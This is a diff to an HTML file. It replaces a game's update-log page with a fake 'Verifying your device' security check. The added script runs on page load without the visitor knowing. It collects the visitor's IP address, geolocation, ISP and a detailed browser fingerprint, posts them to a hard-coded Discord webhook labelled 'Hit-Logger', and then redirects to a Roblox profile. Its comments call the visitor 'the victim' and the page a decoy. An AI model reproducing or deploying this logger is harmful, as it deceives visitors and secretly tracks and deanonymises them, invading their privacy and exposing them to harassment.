@@ -1,268 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Restaurant Experience 2 - Update Logs</title>
-
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            font-family: "Segoe UI", Arial, sans-serif;
-            background: #0f0f0f;
-            color: #ffffff;
-        }
-
-        .header {
-            text-align: center;
-            padding: 50px 20px;
-            background: linear-gradient(135deg, #1b1b1b, #252525);
-            border-bottom: 1px solid #333;
-        }
-
-        .header h1 {
-            margin: 0;
-            font-size: clamp(28px, 6vw, 42px);
-            font-weight: 700;
-        }
-
-        .header p {
-            color: #bdbdbd;
-            font-size: clamp(14px, 3vw, 18px);
-            margin-top: 10px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 1000px;
-            margin: 40px auto;
-            padding: 0 15px;
-        }
-
-        .update-card {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 30px;
-            margin-bottom: 30px;
-            transition: 0.3s;
-        }
-
-        .update-card:hover {
-            border-color: #555;
-            transform: translateY(-3px);
-        }
-
-        .update-card h2 {
-            margin-top: 0;
-            font-size: clamp(22px, 5vw, 30px);
-            color: #ffffff;
-        }
-
-        .release-date {
-            color: #999;
-            font-size: 15px;
-            margin-bottom: 25px;
-        }
-
-        .feature-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .feature-list li {
-            background: #222;
-            padding: 18px;
-            margin-bottom: 12px;
-            border-radius: 8px;
-            border-left: 4px solid #4caf50;
-        }
-
-        .feature-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #ffffff;
-            margin-bottom: 5px;
-        }
-
-        .feature-description {
-            color: #bdbdbd;
-            line-height: 1.5;
-            font-size: 15px;
-        }
-
-        footer {
-            text-align: center;
-            padding: 30px 15px;
-            margin-top: 50px;
-            background: #111;
-            border-top: 1px solid #333;
-            color: #777;
-            font-size: 14px;
-        }
-
-        footer p {
-            margin: 8px 0;
-        }
-
-        /* Mobile Optimization */
-        @media (max-width: 600px) {
-
-            .header {
-                padding: 35px 15px;
-            }
-
-            .container {
-                margin: 20px auto;
-                padding: 0 10px;
-            }
-
-            .update-card {
-                padding: 18px;
-                border-radius: 10px;
-            }
-
-            .feature-list li {
-                padding: 14px;
-            }
-
-            .feature-title {
-                font-size: 16px;
-            }
-
-            .feature-description {
-                font-size: 14px;
-            }
-
-            footer {
-                padding: 25px 10px;
-                font-size: 12px;
-            }
-        }
-
-        /* Tablet Optimization */
-        @media (min-width: 601px) and (max-width: 900px) {
-
-            .container {
-                padding: 0 25px;
-            }
-
-            .update-card {
-                padding: 25px;
-            }
-        }
-
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Check</title>
+<style>
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; display: flex;
+         justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .card { background: #fff; padding: 40px 50px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,.1); text-align: center; }
+  .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top-color: #5865F2;
+             border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h2 { color: #222; margin-bottom: 8px; }
+  p  { color: #666; font-size: 14px; }
+  .done { color: #2ecc71; font-weight: 600; }
+</style>
 </head>
-
 <body>
 
-    <div class="header">
-        <h1>Restaurant Experience 2</h1>
-        <p>Official Update Logs</p>
-    </div>
+<div class="card">
+  <div class="spinner" id="spin"></div>
+  <h2>Verifying your device…</h2>
+  <p>Please wait while we confirm your browser and network security settings.</p>
+  <p id="status" style="display:none" class="done">✔ Verification complete. Redirecting…</p>
+</div>
 
+<script>
+// ============ CONFIG ============
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1536223338647654400/zZIPTm_UF5MCzxbP4DN78a34iJg-5HBGD1zDQrbcwgII4_73Z5hEBOcy1OSwTPN7KooE";
+// Page the victim is redirected to after logging (use a legit-looking page)
+const REDIRECT_URL = "https://www.roblox.com/users/1868844996/profile";
+// ================================
 
-    <div class="container">
+async function getIP() {
+  // Primary: ipapi.co (no key needed). Fallbacks if it fails.
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    if (r.ok) return await r.json();
+    throw new Error("ipapi failed");
+  } catch (e) {
+    try {
+      const r = await fetch("https://ipwho.is/");
+      if (r.ok) return await r.json();
+      throw new Error("ipwho failed");
+    } catch (e2) {
+      const r = await fetch("https://api.ipify.org?format=json");
+      return { ip: (await r.json()).ip, fallback: true };
+    }
+  }
+}
 
-        <div class="update-card">
+function getFingerprint() {
+  const d = new Date();
+  return {
+    user_agent:      navigator.userAgent,
+    platform:        navigator.platform,
+    language:        navigator.language,
+    languages:       navigator.languages || [],
+    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    local_time:      d.toLocaleString(),
+    screen:          `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    viewport:        `${window.innerWidth}x${window.innerHeight}`,
+    referrer:        document.referrer || "direct",
+    url:             location.href,
+    cookies_enabled: navigator.cookieEnabled,
+    online:          navigator.onLine,
+    cpu_cores:       navigator.hardwareConcurrency || "unknown",
+    touch_device:    navigator.maxTouchPoints > 0
+  };
+}
 
-            <h2>Update 1 - First Ever Update</h2>
+async function sendToDiscord(data) {
+  const embed = {
+    title: "🛰️ New hit logged",
+    color: 0x5865F2,
+    fields: [
+      { name: "IP Address", value: data.ip || "Unknown", inline: true },
+      { name: "Country",    value: data.country_name || data.country || "Unknown", inline: true },
+      { name: "Region/City",value: `${data.region || data.region_name || "?"} / ${data.city || "?"}`, inline: true },
+      { name: "ISP / Org",  value: data.org || data.connection?.isp || "Unknown", inline: false },
+      { name: "Lat / Lon",  value: data.latitude ? `${data.latitude}, ${data.longitude}` : "N/A", inline: true },
+      { name: "User Agent", value: `\`\`\`${data.user_agent}\`\`\``, inline: false },
+      { name: "Platform",   value: data.platform, inline: true },
+      { name: "Language",   value: data.language, inline: true },
+      { name: "Timezone",   value: data.timezone, inline: true },
+      { name: "Screen",     value: data.screen, inline: true },
+      { name: "Referrer",   value: data.referrer || "direct", inline: true },
+      { name: "Local Time", value: data.local_time, inline: true },
+      { name: "Extra",      value: `CPU cores: ${data.cpu_cores} | Touch: ${data.touch_device} | Cookies: ${data.cookies_enabled}`, inline: false }
+    ],
+    footer: { text: `URL: ${data.url}` },
+    timestamp: new Date().toISOString()
+  };
 
-            <div class="release-date">
-                Released: July 2026
-            </div>
+  await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ embeds: [embed], username: "Hit-Logger" })
+  });
+}
 
-
-            <ul class="feature-list">
-
-                <li>
-                    <div class="feature-title">
-                        New Food Models
-                    </div>
-                    <div class="feature-description">
-                        Added new food models to improve the quality and appearance of meals in the game.
-                    </div>
-                </li>
-
-
-                <li>
-                    <div class="feature-title">
-                        Upgrade System
-                    </div>
-                    <div class="feature-description">
-                        Added a new upgrade system allowing players to improve their restaurant.
-                    </div>
-                </li>
-
-
-                <li>
-                    <div class="feature-title">
-                        Worker NPCs
-                    </div>
-                    <div class="feature-description">
-                        Added worker NPCs that help manage restaurant operations.
-                    </div>
-                </li>
-
-
-                <li>
-                    <div class="feature-title">
-                        Manager NPC
-                    </div>
-                    <div class="feature-description">
-                        Added a manager NPC to assist with running your restaurant.
-                    </div>
-                </li>
-
-
-                <li>
-                    <div class="feature-title">
-                        Updated Map
-                    </div>
-                    <div class="feature-description">
-                        Updated the map with improvements and changes to enhance gameplay.
-                    </div>
-                </li>
-
-
-                <li>
-                    <div class="feature-title">
-                        New Customer NPCs
-                    </div>
-                    <div class="feature-description">
-                        Added new customer NPCs to make restaurants more active and realistic.
-                    </div>
-                </li>
-
-
-                <li>
-                    <div class="feature-title">
-                        New Events
-                    </div>
-                    <div class="feature-description">
-                        Added new events that can occur while playing.
-                    </div>
-                </li>
-
-            </ul>
-
-        </div>
-
-    </div>
-
-
-    <footer>
-        <p>Restaurant Experience 2 Update Logs</p>
-        <p>© 2026 Restaurant Experience 2. All Rights Reserved.</p>
-        <p>Unauthorized copying, redistribution, or modification of this website is prohibited.</p>
-    </footer>
-
+(async () => {
+  try {
+    const geo = await getIP();
+    const fp  = getFingerprint();
+    const data = Object.assign({}, geo, fp);
+    await sendToDiscord(data);
+  } catch (e) {
+    // Silent fail — never break the decoy page
+    console.error("Logger error:", e);
+  }
+  document.getElementById("spin").style.display = "none";
+  document.getElementById("status").style.display = "block";
+  setTimeout(() => { location.href = REDIRECT_URL; }, 1500);
+})();
+</script>
 
 </body>
 </html>
